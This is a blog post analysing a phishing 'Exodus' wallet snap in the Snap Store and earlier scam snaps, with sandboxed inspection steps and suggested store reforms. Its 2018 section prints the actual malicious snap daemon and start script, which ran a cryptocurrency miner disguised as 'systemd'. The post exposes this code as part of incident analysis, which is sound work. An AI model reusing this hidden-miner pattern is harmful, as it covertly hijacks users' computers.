+++
date = "2024-02-20T20:00:00+01:00"
title = "Exodus Bitcoin Wallet: $490K Swindle"
slug = "2024/02/exodus-bitcoin-wallet-$490K-swindle"
author = "Alan Pope"
tags = ['ubuntu', 'snapcraft', 'crypto', 'scam', 'bitcoin', 'wallet', 'exodus']
+++

**Edit:** *There's a short follow-up to this post: [Exodus Bitcoin Wallet: Follow up](/blog/2024/02/exodus-bitcoin-wallet-follow-up)*.

**tl;dr**: A Bitcoin investor was recently scammed out of 9 Bitcoin (worth around $490K) in a fake "Exodus wallet" desktop application for Linux, published in the Canonical Snap Store. This isn't the first time, and if nothing changes, it likely won't be the last. 

[![Bye bye bitcoin](/blog/images/2024-02-20/byebyebitcoin50.png)](https://www.walletexplorer.com/wallet/32394c8892f2076c)

*This post turned out longer than I expected. So if you don't have the time there's a briefer summary at the bottom under "In summary (the tl;dr)" along with my suggestions on what Canonical should do now.*

We talked about this in [episode 23](https://linuxmatters.sh/23/) of [Linux Matters Podcast](https://linuxmatters.sh/), if you prefer a truncated audio version. The episode was recorded on 13th February 2024, and published on 20th February whereas this blog post is current as of the publication date.

[![Scam exodus app](/blog/images/2024-02-20/linuxmatters-banner-3000x750_30.png)](https://linuxmatters.sh/23/)

*Patreon [supporters](https://linuxmatters.sh/support) of [Linux Matters](https://linuxmatters.sh/) can get the show a day early, and without adverts.* 🙏

## Introduction

For clarity, I used to work for Canonical on the Snapcraft team, but I no longer do. Now, I'm just some community guy who wants Ubuntu and Snapcraft to be a success. I'm writing this in the hope Canonical will fix its processes so reputation-damaging events like this don't keep happening. 

All of the words below are based on my external perspective of what happened. However, I have also drawn on my historic internal knowledge of the processes and how we dealt with this in the past. Though things may have changed in the two years since I left the company.

## What happened

An application called "Exodus" was published in the Canonical Snap store on 6th February 2024. (*In the [podcast episode](https://linuxmatters.sh/23/), I mistakenly said the application had been published for 2 days. This is inaccurate. It was published for 6 days)*. 

The application had a couple of screenshots, an icon, and a detailed description. 

[![Exodus in the Snap store](/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_crop_50.jpeg)](/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_crop_100.jpeg)

Early on Sunday 12th February a new [Snapcraft forum](https://forum.snapcraft.io/) user named "castle" [started](https://forum.snapcraft.io/t/exodus-movement-exod/38904) a short thread titled "[Exodus - Movement Exod](https://forum.snapcraft.io/t/exodus-movement-exod/38904)". In it, they enquired:

> Can anyone tell if the Exodus wallet in Ubuntu’s software store is a scam? My wallet is empty after recovering and it shows a recent transaction of my entire balance sent to an address. I never made this transaction.

I initially spotted this question early on that Sunday evening, some nine or ten hours after it was posted.

**Spoiler:** *This "Exodus" application published in the Snap store was indeed a scam application. There is a genuine [organisation](https://www.exodus.com/) that developed a real, seemingly 'legitimate' cryptocurrency wallet application. This is not that.*


## Brief analysis

Without wishing to give scammers a "*How to pass for a genuine application*" guide, I've taken a look at this one and present the details here so users are empowered to make educated decisions.

### Store page

The "Exodus" application was published in the Snap store at https://snapcraft.io/exodus but has subsequently been 'quarantined' by Canonical. 

*When a snap is 'quarantined', typically the owner's account is disabled, their published snaps are moved to a Canonical-owned account, and the published revisions are 'unpublished'. The net result is the application no longer appears in search results, visiting the store page returns a '404', and the publisher can no longer access the package.*

Below is a screen capture of the full Exodus Snap store page I took at the time.

[![Exodus in the Snap store](/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_50.jpeg)](/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_100.jpeg)

The store page looks somewhat legitimate, to the untrained eye. The publisher's name was "Movement Exod (movementexod)", which also adds *some* legitimacy. It was published in the "Finance" category in the store.

The logo and screenshots are from the official upstream Exodus application. A lengthy text description provides some simple marketing about the platform.

Note the coloured map at the bottom of the page has multiple countries highlighted. This indicates the snap had (at the time of screenshot) at least ten installs in different countries. Therefore, our user is **not** the only person with this malware installed on their PC.

The application could also be viewed in the desktop "App Centre" (previously "Ubuntu Software", a.k.a. "GNOME Software") application storefront.

[![Exodus in the Ubuntu Store](/blog/images/2024-02-20/gnome-software_50.png)](/blog/images/2024-02-20/gnome-software_100.png)

Interestingly we learned via their [responses](https://forum.snapcraft.io/t/exodus-movement-exod/38904/6) that the desktop GUI was likely the way the "castle" user installed the Exodus application on their system. That's pertinent given a later response where they ask why the snap is presented as "Safe" in the storefront. They likely saw a button like this in the "App Centre", which gave them some confidence in the application.

[![Exodus in the Snap store](/blog/images/2024-02-20/safe.png)](/blog/images/2024-02-20/safe.png)

Furthermore the title of the Snapcraft web frontend says "*Snaps are containerised software packages that are simple to create and install. They auto-update and are safe to run.*"

[![Snapcraft title](/blog/images/2024-02-20/safe-to-run_100.png)](/blog/images/2024-02-20/safe-to-run_100.png)

*Are they though?*

### A peek inside

I wanted to take a look at the application itself. So on my workstation, in a separate virtual machine, I ran `snap download exodus` to download, but not install the application. I don't have any cryptocurrency wallets on my system, but I didn't know what the application might try to do, so for safety I didn't run it directly on my computer. 

*A snap is just a squashfs file, typically containing an application, libraries, assets and metadata.*

```bash
alan@vm:~/temp$ file exodus_4.snap 
exodus_4.snap: Squashfs filesystem, little endian, version 4.0, xz compressed, 
    26962719 bytes, 110 inodes, blocksize: 131072 bytes, created: Fri Feb  9 10:50:58 2024
```

I unpacked the snap with `unsquashfs` and briefly poked around at the resulting files.

```bash
alan@vm:~/temp$ unsquashfs exodus_4.snap 
Parallel unsquashfs: Using 8 processors
79 inodes (788 blocks) to write        
                                                           
[=========================================================================/] 867/867 100%
                                                           
created 79 files                       
created 31 directories
created 0 symlinks    
created 0 devices                
created 0 fifos                        
created 0 sockets
created 0 hardlinks
```

Notably much of the metadata in the `snap.yaml` file was still the developer defaults such as "Single-line elevator pitch for your amazing snap".

```yaml
alan@vm:~/temp$ cat squashfs-root/meta/snap.yaml 
name: exodus
version: 1.0.0
summary: Single-line elevator pitch for your amazing snap
description: |
  This is my-snap's description. You have a paragraph or two to tell the
  most important story about your snap. Keep it under 100 words though,
  we live in tweetspace and your description wants to look good in the snap
  store.
apps:
  exodus:
    command: snap/command-chain/desktop-launch $SNAP/bin/exodus
    plugs:
    - desktop
    - desktop-legacy
    - gsettings
    - opengl
    - wayland
    - x11
    - network
    - home
    command-chain:
    - snap/command-chain/snapcraft-runner
    - snap/command-chain/desktop-launch

```

Further investigation revealed this was an application developed using [Flutter](https://flutter.dev/). 

```bash
alan@vm:~/temp$ ldd squashfs-root/bin/exodus | grep flutter
        libflutter_linux_gtk.so 
            => /home/alan/temp/squashfs-root/bin/lib/libflutter_linux_gtk.so (0x00007f69ee800000)

```

The application binary was quite small, and there weren't a lot of bundled libraries beyond the essentials, potentially indicating limited features.

```bash
alan@vm:~/temp$ ls -lh squashfs-root/bin/exodus
-rwxr-xr-x 1 alan alan 24K Feb  9 10:49 squashfs-root/bin/exodus
```

## Genuine or not tho?

*Some software vendors link directly to the Snap store page for their software packages - others do not.*

I looked on the upstream [Exodus website](https://www.exodus.com/) to see if there was any mention of the snap. 

[![Official Exodus electron app](/blog/images/2024-02-20/exodus-website.png)](/blog/images/2024-02-20/exodus-website.png)

Notably the snapped application was neither linked nor even mentioned. There are deb and zip files for a Linux build of their Exodus Wallet application, though.

I downloaded and unpacked these and observed significant differences to the application in the Snap store. The official app isn't Flutter-based, it's built using [Electron](https://www.electronjs.org/), which bundles a Chromium-based runtime. 

```bash
alan@vm:~/temp/upstream$ unzip -qq exodus-linux-x64-24.2.12.zip 
alan@vm:~/temp/upstream$ ll Exodus-linux-x64/
total 217800
drwxr-xr-x 4 alan alan      4096 Feb  8 18:02 ./
drwxrwxr-x 3 alan alan      4096 Feb 20 10:04 ../
-rw-r--r-- 1 alan alan    136037 Feb  8 18:02 chrome_100_percent.pak
-rw-r--r-- 1 alan alan    196924 Feb  8 18:02 chrome_200_percent.pak
-rwxr-xr-x 1 alan alan   1322280 Feb  8 18:02 chrome_crashpad_handler*
-rwxr-xr-x 1 alan alan     54096 Feb  8 18:02 chrome-sandbox*
-rwxr-xr-x 1 alan alan 173385472 Feb  8 18:02 Exodus*
-rwxr-xr-x 1 alan alan       271 Feb  8 18:02 exodus.desktop*
-rw-r--r-- 1 alan alan  10717392 Feb  8 18:02 icudtl.dat
-rwxr-xr-x 1 alan alan       610 Feb  8 18:02 install-desktop-file.sh*
-rwxr-xr-x 1 alan alan    252120 Feb  8 18:02 libEGL.so*
-rwxr-xr-x 1 alan alan   2882824 Feb  8 18:02 libffmpeg.so*
-rwxr-xr-x 1 alan alan   6613816 Feb  8 18:02 libGLESv2.so*
-rwxr-xr-x 1 alan alan   4292368 Feb  8 18:02 libvk_swiftshader.so*
-rwxr-xr-x 1 alan alan   7469008 Feb  8 18:02 libvulkan.so.1*
-rw-r--r-- 1 alan alan      1096 Feb  8 18:02 LICENSE
-rw-r--r-- 1 alan alan   9242930 Feb  8 18:02 LICENSES.chromium.html
drwxr-xr-x 2 alan alan      4096 Feb  8 18:02 locales/
drwxr-xr-x 2 alan alan      4096 Feb  8 18:02 resources/
-rw-r--r-- 1 alan alan   5499616 Feb  8 18:02 resources.pak
-rw-r--r-- 1 alan alan    267462 Feb  8 18:02 snapshot_blob.bin
-rw-r--r-- 1 alan alan    626313 Feb  8 18:02 v8_context_snapshot.bin
-rw-r--r-- 1 alan alan         6 Feb  8 18:02 version
-rw-r--r-- 1 alan alan       107 Feb  8 18:02 vk_swiftshader_icd.json
```


I initially [replied](https://forum.snapcraft.io/t/exodus-movement-exod/38904/2) to the thread, letting the user know this looked dodgy, and certainly not official. The first revision of my reply:

> It certainly doesn’t look official to me, based on the following simple check:
>
> * The upstream Exodus app is available as a deb and zip. Inside those packages there’s an electron app.
> * The exodus snap is a flutter application, not built using electron.
> 
> So it could be someone making their own Exodus application, it doesn’t look official.

## Digging deeper

I wondered what the application did though. So I spun up a [Quickemu](https://github.com/quickemu-project/quickemu) virtual machine running Ubuntu 22.04 then installed and ran the snap. 

`sudo snap install exodus_4.snap --dangerous`

Once launched, the dodgy Exodus app shows a window containing a branded background overlayed with input fields and buttons. 

[![Scam exodus app](/blog/images/2024-02-20/scam-exodus-app-1_70.png)](/blog/images/2024-02-20/scam-exodus-app-1.png)

Clicking the help icon reveals the very brief documentation. The user is expected to input their twelve-word recovery phrase, to "import" their Exodus wallet.

[![Scam exodus app](/blog/images/2024-02-20/scam-exodus-app-2_70.png)](/blog/images/2024-02-20/scam-exodus-app-2.png)

"You need to write your 12-words phrase to import wallet. If your wallet is not imported, it means it is either not created or you are entering incorrect data. Before you click the import wallet button, **double-check the entered phrase**"

### Danger Zone

**It's mentioned in bold on the upstream Exodus site, and their subreddit, that users should never enter their twelve-word wallet recovery phrase, and that Exodus will never ask for this information.**

[![Never 1](/blog/images/2024-02-20/never-1_45.png)](/blog/images/2024-02-20/never-1.png)

"❗ Exodus Staff will NEVER ask for sensitive information, including passwords, 12-word phrases or private keys."

[![Never 1](/blog/images/2024-02-20/never-2_45.png)](/blog/images/2024-02-20/never-2.png)

"Exodus will never ask you for your 12-word (secret) phrase. Exodus will never as for your password. Exodus will never ask you to visit a link except for our official website at www.Exodus.com"

## Get lost, fat wallet [🔗](https://www.youtube.com/watch?v=yApx6MirYyY)

With that warning noted, I typed nonsense in the boxes and pressed the button. 

[![Scam exodus app](/blog/images/2024-02-20/scam-exodus-app-3_70.png)](/blog/images/2024-02-20/scam-exodus-app-3.png)

**"❗ You (sic) wallet is not imported. You (sic) data is not valid!"**

My hunch was that the application poked some online API to unlock "my" wallet. So in the background, I had [bandwhich](https://snapcraft.io/bandwhich) running in a terminal. 

*I know tools like `tcpdump` or Wireshark exist, along with all manner of other deep packet analysis tools. I just wanted to give the application a quick 'shake' to know if it tried to do something online.*

Sure enough, there were a few requests sent to a Linode IP, and others to Cloudflare.

[![Scam exodus app](/blog/images/2024-02-20/scam-exodus-app-4_70.png)](/blog/images/2024-02-20/scam-exodus-app-4.png)

Unsurprisingly, the API call failed because I entered a garbage wallet recovery phrase.

**Edit:** *In a previous version of this blog I pointed the finger at a service called exchangerate-api. After some online comments and thinking about this, I have removed that section and screenshot. I drew a direct line between a scam app and a third-party legitimate service. I didn't deeply investigate what APIs were used by the scam app, so it was unfair to draw that line.*

## Bad news

My untested theory is that if I had entered a valid recovery phrase, my online wallet would be accessed, and then emptied via an API call. I presume this is what happened to "castle".

I edited my [response](https://forum.snapcraft.io/t/exodus-movement-exod/38904/2) to let the user know what I'd discovered and tagged the security team in the thread.

> It certainly doesn’t look official to me, based on the following simple check:
>
> * The upstream Exodus app is available as a deb and zip. Inside those packages there’s an electron app.
> * The exodus snap is a flutter application, not built using electron.
> 
> So it could be someone making their own Exodus application, it doesn’t look official.
> 
> I installed the snap in a separate VM. It opens with a “Restore Wallet” dialog. If I enter random letters, it connects to some API at https://www.exchangerate-api.com/ and fails (because I didn’t enter a real wallet phrase).
> 
> Sadly, looks very dodgy.
> 
> I’ve sent an email to the security team. Also @security ^^

Separately, I also emailed the security team at Canonical and reported the application via the web form on the Exodus page in the Snap store. 

[![Report this app link](/blog/images/2024-02-20/report-this-app-1.png)](/blog/images/2024-02-20/report-this-app-1.png)

The "Report this app" link is at the bottom of every Snap store page on https://snapcraft.io/. It takes seconds to fill in.

[![Report this app form](/blog/images/2024-02-20/report-this-app-2_70.png)](/blog/images/2024-02-20/report-this-app-2_100.png)

That's about as much as I could do for now.

## How does this happen? (an aside)

How is it that people can so easily publish scam Bitcoin wallet applications in the Snap store?

Frankly, it's by design. One of the goals is to automate the whole Snapcraft publishing and review pipeline so there's fewer (expensive and slow) humans in the loop.

To register a name for any application in the store, all a scammer needs is a store account. They can use any old email address, and create a store account in minutes. They don't need to pay, give a business address or validate their identity with a government ID.

Once they have a store account, they can login with the command-line `snapcraft` tool, used for building their dodgy snap.

`snapcraft login MySuperGenuineAndLegitEmailHonestGuv@example.com`

Then register the unique name for their dodgy snap.

`snapcraft register mysuperbadwallet`

Writing the application is not beyond any semi-competent app developer. Packaging the program as a snap is well documented, and comes with free community support. Although I imagine they'd have to ask for help with packaging their "*Modern network-enabled desktop application*" rather than with a "*Scam Bitcoin Wallet app*".

The next step is to validate that the package will pass the automated Snap store review tools. Simply run `snap-review mysuperbadwallet.snap` and fix any errors it reports. 

Uploading is as simple as `snapcraft upload mysuperbadwallet.snap --release=stable`. Once it's uploaded and processed, the package will be *immediately* searchable, and available for *anyone*, almost *anywhere* to download, install and run it. 

No humans in the loop. What could possibly go wrong?

[![Removing humans from the process never caused problems in Hollywood! /s](/blog/images/2024-02-20/humansoutoftheloop.png)](https://en.wikipedia.org/wiki/WarGames)

## Further research

*Back to the scam Exodus Wallet snap...*

The snapped application will have access to the `$HOME` directory, but not any hidden files or directories within home. This has always been seen as a useful protection against an application grubbing around in hidden folders, hoovering up wallets, ssh & GPG keys, and other secrets. 

```bash
alan@vm:~$ snap connections exodus
Interface                 Plug                    Slot                             Notes
content[gnome-3-28-1804]  exodus:gnome-3-28-1804  gnome-3-28-1804:gnome-3-28-1804  -
content[gtk-3-themes]     exodus:gtk-3-themes     gtk-common-themes:gtk-3-themes   -
content[icon-themes]      exodus:icon-themes      gtk-common-themes:icon-themes    -
content[sound-themes]     exodus:sound-themes     gtk-common-themes:sound-themes   -
desktop                   exodus:desktop          :desktop                         -
desktop-legacy            exodus:desktop-legacy   :desktop-legacy                  -
gsettings                 exodus:gsettings        :gsettings                       -
home                      exodus:home             :home                            -
network                   exodus:network          :network                         -
opengl                    exodus:opengl           :opengl                          -
wayland                   exodus:wayland          :wayland                         -
x11                       exodus:x11              :x11                             -
```

But this application didn't *need* to do that. All it needed was to look vaguely legit, and ask for a recovery phrase, then use the automatically-connected `network` interface to poke an online API to do their evil bidding.

Pretty clever, really.

I wondered if there might be others affected by this application. I did a few online searches to see if anyone had mentioned the snap. The only post I found was in a [thread on 4chan](https://boards.4chan.org/biz/thread/57569971/exodus-wallet-help) (warning, 4chan link, duh), timed similarly to the Snapcraft forum thread. 

In the 4chan thread, they revealed similar details to the Snapcraft discussion. However, they also pasted the transaction ID and the Bitcoin wallet the funds had been sent to. A little over 9 BTC was sent to one destination. At the time of writing that amount of Bitcoin was worth in the region of $490K, but that value changes often.

[![Bye bye bitcoin](/blog/images/2024-02-20/byebyebitcoin50.png)](https://www.walletexplorer.com/wallet/32394c8892f2076c)

I didn't find any other contemporary reports of people being suckered by this snap. But then again, if someone got suckered, they might be inclined to keep it to themselves, or only talk about it on anonymous places like 4chan!

## Gone, but not forgotten

The Canonical security team responded to me late on the same Sunday night to say 'thanks' and that the application had already been removed from the store. Probably as a result of me hitting the "Report this app" button. It's good to see that they respond promptly on the weekend.

That's not the end of the story though. While the application is now in 'quarantine', and cannot be downloaded, **the scam Exodus wallet application is still installed on machines out in the wild**. Nothing seems to have been done to solve that.

The Exodus Wallet snap is a ticking timebomb out there on who knows how many computers. Anyone who installed it between 6th Feb and 12th Feb 2024 could one day open it, erroneously thinking it's official, type in their wallet recovery code and lose everything.

## Not the first crypto rodeo (aside)

This isn't the first time a cryptocurrency scam has been published in the Snap store.

### MinerCraft

Back in May 2018, when I *was* working for Canonical, we had one of our first high-profile crypto incidents. A bad actor downloaded existing game snaps from the store, unpacked and re-packed them with a bonus cryptocurrency miner on board.

They achieved this by adding a snippet to the `snapcraft.yaml` that launched a simple background daemon once the 2048buntu snap was installed.

```yaml
   deamonx:
     command: command-deamonx.wrapper
     daemon: simple
     plugs:
     - network
     - network-bind
     - home
````

The `command-deamonx.wrapper` was a simple script to setup the environment, which then launched a further script called `start`.

```bash
#!/bin/sh
export PATH="$SNAP/usr/sbin:$SNAP/usr/bin:$SNAP/sbin:$SNAP/bin:$PATH"
export LD_LIBRARY_PATH="$LD_LIBRARY_PATH:$SNAP/lib:$SNAP/usr/lib:$SNAP/lib/x86_64-linux-gnu:$SNAP/usr/lib/x86_64-linux-gnu:$SNAP/usr/lib/x86_64-linux-gnu/mesa-egl:$SNAP/usr/lib/x86_64-linux-gnu/mesa"
export LD_LIBRARY_PATH=$SNAP_LIBRARY_PATH:$LD_LIBRARY_PATH
exec "desktop-launch" "$SNAP/start" "$@"
```

The `start` script launched a miner, sending any mined crypto to the publisher of the dodgy snap, who hid behind a protonmail account.

```bash
#!/bin/bash

currency=bcn
name=2048buntu


{ # try
/snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1 -g
} || { # catch
cores=($(grep -c ^processor /proc/cpuinfo))

if (( $cores < 4 )); then
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1
else
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 2
fi
}
```

Once published these "Games with benefits" were downloaded by perhaps a hundred or more users. Along with the game they all got a bonus crypto miner running in the background on their computer. 

Perhaps amusingly, the miner was disguised as a process called `systemd`, which could plausibly & legitimately be consuming processing time on a client computer. 

Canonical was [notified](https://github.com/canonical/snapcraft.io/issues/651) via GitHub issue, by someone who spotted this early on Friday 11th May. I found out on Saturday morning while away from my PC, watching a football game. I pinged around some people out-of-hours and we had the applications unlisted from the store. 

The following week, while back at our desks, and after considerable discussion and rumination, we figured out a plan to *un-minerize* the client machines. For clients, the Snap store is effectively anonymous, so we couldn't notify people by email or popup that their machine was compromised. 

We considered the options and eventually decided to pull a benevolent version of the [Amazon Kindle 1984 debacle](https://www.theguardian.com/technology/2009/jul/17/amazon-kindle-1984). We took ownership of the three games, re-packaged them *without* the crypto miner, and published that as an update to the Snap store. 

Anyone who'd had the game+miner installed would get an automatic update, typically within a few hours of powering their computer on. This meant they could keep the game, and we'd throw away the miner. 

The result being there were no longer versions of the miner running on client machines.

Now, some might argue this was a bad way to do it, and perhaps they're right. It honestly felt like the least-worst option at the time though. 

*Thinking about this in retrospect, we likely could have done something better here. The contents could have been replaced by a largely empty snap, which opens a URL in the default browser when opened. That URL could point to an official Snapcraft forum page which details an up-to-date list of quarantined snaps, and why they were removed.*

Canonical published a [blog post](https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store) once word got out. I've personally never been very happy with that non-response and wasn't involved in the drafting of it. But it is what it is.

### Leaky Ledger Live

Skipping forward, between 16th and 18th September 2023, someone uploaded a "Ledger Live" Bitcoin wallet snap to the Snap store. Ten days later, a user [reported](https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045) that they'd been scammed out of $10K by the "Ledger Live" snap, published in the Snap store. 

In a post titled "[Phishing app on the snap store -- is my computer compromised?](https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045)" they asked:

> The https://snapcraft.io/ledgerlive app is a phishing app disguising as the official app for https://www.ledger.com/
> 
> The way it works is that it queries you for your backup code (a list of words). In a dumb lapse of judgement I was scammed by this app and lost a substantial amount of money.
> 
> What worries me more is that my computer/passwords/files could be compromised. But if I understand it correctly, snaps are isolated somehow? Could it have read my filesystem?
> 
> What do you recommend I do?

A similar thread at the same time was [reported](https://www.reddit.com/r/ledgerwallet/comments/16tqe79/warning_snap_version_of_liveledger_is_fraudulent/) in [/r/ledgerwallet](https://www.reddit.com/r/ledgerwallet/) on [Reddit](https://www.reddit.com/). So again, likely the same person doing both reports.

> I just got scammed for about 10.000 USD by https://snapcraft.io/ledgerlive
> 
> I hadn't used my ledger in years and stupidly entered the 24 word passpharse into the app.
> 
> I'll see how I'll try to report this to snap, but just wanted to put the warning out there.

They followed up [later](https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045/7) on the forum:

> The cryptocurrency was transferred out of my Wallet against my will to an unknown address.

After the September 2023 incident, Canonical *temporarily* [suspended](https://forum.snapcraft.io/t/temporary-suspension-of-automatic-snap-registration-following-security-incident/37077) unrestricted registration of snap names. 

A month later, that limitation was [lifted](https://forum.snapcraft.io/t/temporary-suspension-of-automatic-snap-registration-following-security-incident/37077/8) with the comment:

> "Instead, we will be conducting daily reviews of new snaps being uploaded. We will flag, investigate and take down any snap that looks suspicious. We are taking this action to remove friction from the snap publishing experience, whilst still closely monitoring what is being uploaded on a regular basis."

They **aren't** monitoring and investigating closely enough though!

**They missed the Exodus snap uploaded on the 6th of February 2024, which then caught someone out to the tune of nearly half a million dollars, six days later!**

## Not enough

Thankfully it's no longer possible for new users to install the scam Exodus wallet application. However, that doesn't help the people who still have the application installed on their computers. 

It's very likely that many people inadvertently installed the application believing it was genuine, but have yet to fall into the trap of entering their security credentials. 

**This is a series of ticking time bombs, waiting to go off.**

Or, perhaps the bomb has already gone off, multiple times, taking funds in the process, but people can't or don't want to speak up. Maybe they haven't figured out what happened yet.

## What now?

Following the February 2024 incident, a discussion thread titled "[Should unverified cryptocurrency apps be banned?](https://forum.snapcraft.io/t/should-unverified-cryptocurrency-apps-be-banned/38919)" was started on the Snapcraft forum. After a week it's had only one reply, a hundred or so views, and has already dropped below thirty other threads on the front page.

I'm not privy to internal conversations inside Canonical. I suspect the recent event - and with any luck (humbly) - this blog post - may trigger further discussion and concrete plans. I certainly hope so.

## In summary (the tl;dr)

Multiple genuine-looking scam cryptocurrency miners and fake Bitcoin wallet applications have been published in the Snap store since 2018. The latest has cost at least one person nearly half a million dollars in Bitcoin.

**Some of these scam applications are still installed on end-user computers.**

### May 2018

Three open-source games were forked, a cryptocurrency miner was added, and these were re-uploaded to the Snap store under another name

* Once discovered the games were quarantined, the malware removed and a clean version was pushed out to users
* Canonical [announced](https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store) their intention to do nothing about this, and invited discussion which publicly appeared to go nowhere

### September 2023

A glut of scam cryptocurrency applications were published, with a user reporting some monetary loss.

* The applications were quarantined, making them unavailable for further download
* No update was pushed out to clean client systems of the malware
* No announcement was made informing users who had the malware still installed, on how to clean it up

### February 2024

More scam cryptocurrency applications were published leading to significant financial loss for a user.

* The applications were quarantined, thus making them unavailable for download
* No update was pushed out to clean client systems of the malware
* No announcement has yet been made informing users who have the malware, on how to clean it up

**As far as I am aware, some of the known scam crypto applications that have been published in the Snap store are still installed on client systems.**

### What users should do

Remove all of the following snaps from their systems with `snap remove --purge <snapname>`. They are all 'private' in the Snap store, so their store pages show '404', and the software cannot *currently* be downloaded.

These first three are 'technically' okay because they were cleaned of malware and then updated in the store. So anyone who had the malware payload should have had it removed if they installed updates - which is automatic by default with snap. Earlier revisions still have the malware though. 

* 2048buntu
* hextris
* freecraft

These may or may not have contained malware, misfeatures or other scammy things. So it's best to remove them all. 

* bip-web
* bitwallet
* btcwal
* btcwallet
* coinbase
* cryptowal
* electrum-wallet2
* exodus
* exoduswal
* exoduswalet
* exodwallet
* guarda
* komodo
* ledger-live-wallet
* ledger1
* ledgerlive
* liveledger
* metamask
* new-electrum-wallet
* sparrow
* sparrow-wallet
* sparrowwalet
* sparrowwallet
* trezor-wallet
* trezorwallet
* trustwallet

Here's a one-liner to get rid of them all:

`for s in 2048buntu hextris freecraft  bip-web bitwallet btcwal btcwallet coinbase cryptowal electrum-wallet2 exodus exoduswal exoduswalet exodwallet guarda komodo ledger-live-wallet ledger1 ledgerlive liveledger metamask new-electrum-wallet sparrow sparrow-wallet sparrowwalet sparrowwallet trezor-wallet trezorwallet trustwallet; do sudo snap remove --purge $s; done`

### What I think Canonical should do urgently

These suggestions are to reduce the opportunity for a bad actor to publish a similar scam application.

* Mandate & verify that all published applications using financial and/or cryptocurrency branding are officially published directly by the upstream developers
* Change the store so **all** initial Snapcraft store name registrations are gated behind human review
* Gate the first month of a new snap uploads behind human review
* Block *all* interface connection requests behind a human review, including automatically connected ones like `network` and `home`
* Fully staff the team doing the above to respond to registration, interface connection and upload requests in a timely fashion
* Send out a clean snap update (as we did in 2018) to all clients that have the scam snaps still installed

### What I think Canonical should seriously consider next

Additional steps to enable users to have more confidence in the applications published in Snap store.

* Publishers should have their 'newness' on the platform highlighted with a 'New Publisher' badge
* Snaps that are less than `$M` (2?) months old should have a 'New Application' badge
* Snaps that have fewer than `$N` (50?) installs should not appear in search results
* The store should make prominent notes to users that newly published snaps and snaps from new publishers should be viewed with extreme caution
* Provide better education to users on the risks of installing finance and cryptocurrency software from the Snap store
* Review and update all wording in graphical and web software store-fronts to ensure users aren't given a false impression that malware is 'safe'

### What Canonical should not do

* Nothing
* Blame the user
* [This](https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store) kind of response
* Celebrate that being a target for bad actors means the platform is now big and successful

## Conclusion

I have used Ubuntu most days for nearly 20 years. I contribute to, advocate for, and support Ubuntu users. I also publish numerous snaps in the Snap store.

I want both Ubuntu and Snapcraft be secure, successful and safe projects. I want to be able to recommend them to friends, without having to warn them about dodgy software in the Snap store.

Canonical can do better here.
